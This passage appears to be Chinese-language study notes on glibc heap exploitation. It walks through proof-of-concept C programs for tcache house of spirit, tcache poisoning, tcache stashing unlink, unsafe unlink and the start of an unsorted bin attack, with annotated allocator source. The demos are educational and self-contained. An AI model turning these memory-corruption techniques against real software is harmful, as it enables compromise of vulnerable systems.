	<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>a<span class="token punctuation">;</span> <span class="token comment">//pointer that will be overwritten</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> fake_chunks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//fake chunk region</span>

	fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> <span class="token comment">// this is the size</span>

	a <span class="token operator">=</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Freeing the overwritten pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc(0x30): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>b <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请一个chunk</p>
<p>栈中开辟0x88的空间&#x3D;&#x3D;》开头的0x8备用（a），后面的0x80作为fake_chunk,size为0x40</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628170652991.png"></p>
<p>释放fake_chunk:</p>
<p>进入tcache</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628170806330.png"></p>
<p>此时申请chunk将会申请到栈上的fake_chunk</p>
<p><strong>tcache释放检查机制：</strong></p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">USE_TCACHE</span></span>
  <span class="token punctuation">&#123;</span>
    <span class="token class-name">size_t</span> tc_idx <span class="token operator">=</span> <span class="token function">csize2tidx</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache
	<span class="token operator">&amp;&amp;</span> tc_idx <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_bins
	<span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
	<span class="token function">tcache_put</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span></code></pre>

<p>释放时通过chunk的size来确定存入哪一个tcache&#x3D;&#x3D;》只需要tcache未满，即可链入</p>
<h3 id="tcache-poisoning-c"><a href="#tcache-poisoning-c" class="headerlink" title="tcache_poisoning.c"></a>tcache_poisoning.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token comment">// disable buffering</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">size_t</span> stack_var<span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The address we want malloc() to return is %p.\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocating 2 buffers.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">intptr_t</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc(128): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">intptr_t</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc(128): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Freeing the buffers...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now the tcache list has [ %p -> %p ].\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"</span>
		   <span class="token string">"to point to the location to control (%p).\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token punctuation">)</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
	b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now the tcache list has [ %p -> %p ].\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1st malloc(128): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now the tcache list has [ %p ].\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">intptr_t</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2nd malloc(128): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We got the control\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请两个大小相同的chunk并释放&#x3D;&#x3D;》进入tcache&#x3D;&#x3D;》</p>
<p>修改chunk的fd指针到目标地址&#x3D;&#x3D;》再申请即可分配到目标地址</p>
<h3 id="tcache-stashing-unlink-attack-c"><a href="#tcache-stashing-unlink-attack-c" class="headerlink" title="tcache_stashing_unlink_attack.c"></a>tcache_stashing_unlink_attack.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>chunk_lis<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>target<span class="token punctuation">;</span>

    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    stack_var<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//now we malloc 9 chunks</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        chunk_lis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">free</span><span class="token punctuation">(</span>chunk_lis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">//last tcache bin</span>
    <span class="token function">free</span><span class="token punctuation">(</span>chunk_lis<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//now they are put into unsorted bin</span>
    <span class="token function">free</span><span class="token punctuation">(</span>chunk_lis<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>chunk_lis<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// size > 0x90</span>

    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    chunk_lis<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">;</span>

    <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    target <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   

    <span class="token function">assert</span><span class="token punctuation">(</span>target <span class="token operator">==</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请9个chunk，将第4到9的chunk释放（6个）&#x3D;&#x3D;》进入tcache</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628200352811.png"></p>
<p>释放第2个chunk到tcache：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628200510409.png"></p>
<p>释放第1个和第3个chunk：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628200610106.png"></p>
<p>申请一个0xa0的chunk，unsorted bin中的chunk并入small bin：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628202838721.png"></p>
<p>从tcache中申请两个chunk：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628202918789.png"></p>
<p>修改第3个chunk的bk区为目标地址：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628203240014.png"></p>
<p>使用calloc申请chunk&#x3D;&#x3D;》从fastbin，unsorted bin，small bin，large bin中&#x3D;&#x3D;》</p>
<p>在small bin中获取到第1个chunk&#x3D;&#x3D;》</p>
<p>此时由于tcache没满，将small bin中的chunk以倒序的形式填满tcache&#x3D;&#x3D;》</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628203529813.png"></p>
<p>再次申请chunk就将的到目标地址chunk</p>
<h3 id="unsafe-unlink-c"><a href="#unsafe-unlink-c" class="headerlink" title="unsafe_unlink.c"></a>unsafe_unlink.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token class-name">uint64_t</span> <span class="token operator">*</span>chunk0_ptr<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">int</span> malloc_size <span class="token operator">=</span> <span class="token number">0x420</span><span class="token punctuation">;</span> <span class="token comment">//we want to be big enough not to use tcache or fastbin</span>
	<span class="token keyword">int</span> header_size <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>

	chunk0_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>malloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//chunk0</span>
	<span class="token class-name">uint64_t</span> <span class="token operator">*</span>chunk1_ptr  <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>malloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//chunk1</span>

	chunk0_ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">uint64_t</span> <span class="token operator">*</span>chunk1_hdr <span class="token operator">=</span> chunk1_ptr <span class="token operator">-</span> header_size<span class="token punctuation">;</span>

	chunk1_hdr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> malloc_size<span class="token punctuation">;</span>

	chunk1_hdr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;=</span> <span class="token operator">~</span><span class="token number">1</span><span class="token punctuation">;</span>

	<span class="token function">free</span><span class="token punctuation">(</span>chunk1_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">char</span> victim_string<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">strcpy</span><span class="token punctuation">(</span>victim_string<span class="token punctuation">,</span><span class="token string">"Hello!~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> victim_string<span class="token punctuation">;</span>

	chunk0_ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x4141414142424242LL</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"New Value: %s\n"</span><span class="token punctuation">,</span>victim_string<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// sanity check</span>
	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim_string <span class="token operator">==</span> <span class="token number">0x4141414142424242L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>与2.23相比只有需要申请更大的chunk以绕过tcache</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                            </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span><span class="token function">next_chunk</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      </span><span class="token punctuation">\</span>
      <span class="token expression"><span class="token function">malloc_printerr</span> <span class="token punctuation">(</span></span><span class="token string">"corrupted size vs. prev_size"</span><span class="token expression"><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span>
<span class="token comment">//chunksize：获取除了第三标志位之外的大小</span>
<span class="token comment">//next_chunk：下一个chunk的prev_size</span>
<span class="token comment">//该检查检查两处值是否相等，相等则不触发异常</span>
    FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>								      \
    BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>								      \
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">//检查FD->bk == BK->fd == P</span>
<span class="token comment">//检查双链表的完整性</span>
      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted double-linked list"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>			      \
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>								      \
        FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>							      \
        BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>							      \
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span><span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span>			      \
            <span class="token operator">&amp;&amp;</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">//chunksize_nomask:chunk包含了3个标志位的大小</span>
            <span class="token comment">//若该chunk位于small bin或large bin，并且fd_nextsize为空</span>
	    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>	      \
		<span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
            <span class="token comment">//fd_nextsize不为空</span>
            <span class="token comment">//判断双链表完整性</span>
	      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted double-linked list (not small)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   \
            <span class="token keyword">if</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">//下一个chunk的fd_nextsize为空\
                //bins中有与当前chunk大小相同的chunk</span>
                <span class="token comment">//因为只有大小相同的chunk的结点有fd_nextsize</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> P<span class="token punctuation">)</span> 
                    <span class="token comment">//该bins中只有这一种大小的chunk</span>
                    <span class="token comment">//自身的fd_nextsize指向自己\
                  FD->fd_nextsize = FD->bk_nextsize = FD;</span>
                <span class="token comment">//大小相同的下一个chunk作为新结点</span>
                <span class="token comment">//fd_nextsize和bk_nextsize均指向自己\
                else &#123;</span>
                    
                    <span class="token comment">//将fd_nextsize和bk_nextsize赋给下一个大小一样的chunk</span>
                    <span class="token comment">//让其作为该大小新的结点</span>
                    <span class="token comment">//后两句调整大小不一样的chunk指向新结点</span>
                    FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>			      \
                    FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>			      \
                    P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>			      \
                    P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>			      \
                  <span class="token punctuation">&#125;</span>							      \
              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">//该bins中没有与当前chunk大小相同的chunk==》</span>
                <span class="token comment">//fd_nextsize一定不为空\
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
              &#125;								      \
          &#125;								      \
      &#125;									      \
&#125;</span>
</code></pre>



<h3 id="unsorted-bin-attack-c"><a href="#unsorted-bin-attack-c" class="headerlink" title="unsorted_bin_attack.c"></a>unsorted_bin_attack.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

	<span class="token keyword">volatile</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>

